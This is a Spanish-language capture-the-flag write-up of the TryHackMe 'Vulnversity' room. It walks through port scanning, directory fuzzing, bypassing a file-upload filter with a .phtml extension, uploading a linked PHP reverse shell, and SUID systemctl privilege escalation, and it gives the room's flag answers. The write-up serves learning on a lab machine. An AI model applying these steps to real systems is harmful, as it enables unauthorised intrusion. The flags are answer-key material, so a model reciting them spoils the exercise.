---
title: TryHackMe - Vulnversity
cover:
    image: "images/vulnversity-tryhackme/vulnversity.png"
categories: [Linux]
tags: [TryHackMe Writeups, eJPT]
---

Learn about active recon, web app attacks and privilege escalation.

## Tarea 1 

La tarea 1 simplemente es desplegar la máquina, por ende no debemos poner nada.


## Tarea 2 (Reconocimiento)

En esta sección nos proponen usar la herramienta Nmap para hacer un escaneo de puertos.

```
 nmap -sCV -p- --min-rate 5000 -Pn -n -oN escaneo 10.10.152.183
 Nmap scan report for 10.10.152.183
 Host is up (0.23s latency).
 Not shown: 65529 closed tcp ports (conn-refused)
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 3.0.3
 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
 |   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
 |_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
 3128/tcp open  http-proxy  Squid http proxy 3.5.12
 |_http-server-header: squid/3.5.12
 |_http-title: ERROR: The requested URL could not be retrieved
 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Vuln University
 Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
 |_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
 | smb-os-discovery: 
 |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
 |   Computer name: vulnuniversity
 |   NetBIOS computer name: VULNUNIVERSITY\x00
 |   Domain name: \x00
 |   FQDN: vulnuniversity
 |_  System time: 2022-11-23T22:17:45-05:00
 | smb2-time: 
 |   date: 2022-11-24T03:17:45
 |_  start_date: N/A
 |_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 | smb2-security-mode: 
 |   3.1.1: 
 |_    Message signing enabled but not required
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
```

La máquina tiene abirtos los puertos 21(FTP), 22(SSH), 139(NETBIOS-SSN), 445(NETBIOS-SSN) 3128(HTTP-PROXY) y 3333(HTTP)

### Preguntas

1. There are many nmap "cheatsheets" online that you can use too. - ```No answer needed```
2. Scan the box, how many ports are open? - ```6```
3. What version of the squid proxy is running on the machine? - ```3.5.12```
4. How many ports will nmap scan if the flag -p-400 was used? - ```400```
5. Using the nmap flag -n what will it not resolve? - ```DNS```
6. What is the most likely operating system this machine is running? - ```Ubuntu```
7. What port is the web server running on? - ```3333```
8. It’s important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don’t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background) - ```No answer needed```
___

## Tarea 3 (Locating directories)

```
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.152.183:3333/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.152.183:3333/FUZZ
Total requests: 220546

====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
====================================================================

000000002:   301        9 L      28 W       322 Ch      "images"                                                                                                               
000000536:   301        9 L      28 W       319 Ch      "css"                                                                                                                  
000000939:   301        9 L      28 W       318 Ch      "js"                                                                                                                   
000002757:   301        9 L      28 W       321 Ch      "fonts"                                                                                                                
000002970:   301        9 L      28 W       324 Ch      "internal"    
```

### Preguntas
1. What is the directory that has an upload form page? - ```/internal/```

## Tarea 4 (Compromise the webserver)

En la página ```http://10.10.152.183/internal``` tenemos una subida de archivos, intentemos subir un archivo de prueba.

![2022-11-24-01-04.png](https://i.postimg.cc/9F6SpQ3m/2022-11-24-01-04.png)

![2022-11-24-01-07.png](https://i.postimg.cc/dtGMgyjk/2022-11-24-01-07.png)

Como vemos nos dices  ```Extension not allowed ```, muy probablemente en el backend hay algún tipo de lista blanca que solo permita ciertas extensiones

Abriremos el BurpSuite y capturaremos la petición en la cual subimos el archivo, para luego mandarla al Intruder y desde ahí hacer un ataque de fuerza bruta a las diferentes extensiones que luego le coloquemos.

La explicacion de como hacerlo la voy a saltear ya que en el propio laboratorio explica como hacerlo.

![2022-11-24-01-22.png](https://i.postimg.cc/mgMQYbRG/2022-11-24-01-22.png)

Como vemos, la extensión ```.phtml``` está admitida porque la longitud de la respuesta es distinta, vamos a subir un [reverse shell](https://raw.githubusercontent.com/jivoi/pentest/master/shell/rshell.php) con extensión ```.phtml```.

Para eso pueden usar esa reverse shell que coloque ahí, la tienen que modificar poniendo su IP y el puerto que ustedes quieran.

![2022-11-24-01-39.png](https://i.postimg.cc/26DRkdFB/2022-11-24-01-39.png)

Al subir el archivo nos debe salir success, ahora tenemos que ver donde se almacenan los archivos que subimos, para eso vamos a hacer fuzzing en el directorio ```/internal```

```
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.152.183:3333/internal/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.152.183:3333/internal/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000150:   301        9 L      28 W       332 Ch      "uploads"    
```

Como observamos encontramos un directorio uploads, si entramos veremos que ahí esta subida nuestra reverse shell.

![2022-11-24-01-49.png](https://i.postimg.cc/vmHgT9YD/2022-11-24-01-49.png)

Nos pondremos en escucha por el puerto que le dedicamos a la reverse shell y le daremos clic.

![2022-11-24-01-56.png](https://i.postimg.cc/Px0Q1KJS/2022-11-24-01-56.png)

Luego de eso pondremos ```python3 -c 'import pty;pty.spawn("/bin/bash")'```

Si nos dirigimos al ```/home```, veremos que hay un usuario llamado ```bill```, nos meteremos a su directorio y listaremos la flag de user.

### Preguntas

1. What is the name of the user who manages the webserver? - ```bill```
2. What is the user flag? - ```8bd7992fbe8a6ad22a63361004cfcedb```

## Tarea 5 (Privilege Escalation)

Para escalar privilegios, vamos a buscar por permisos SUID.

```
find / -perm -4000 2>/dev/null

/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

Como vemos hay un programa SUID que normalmente no se suele ver, hablo del ```/bin/systemctl```, si lo buscamos en [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#suid) podemos ver que hay una forma de abusar de él para escalar nuestro privilegio.

## Preguntas 

1. On the system, search for all SUID files. What file stands out? - ```/bin/systemctl```
2. Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer? - ```a58ff8579f0a9270368d33a9966c7fd5```
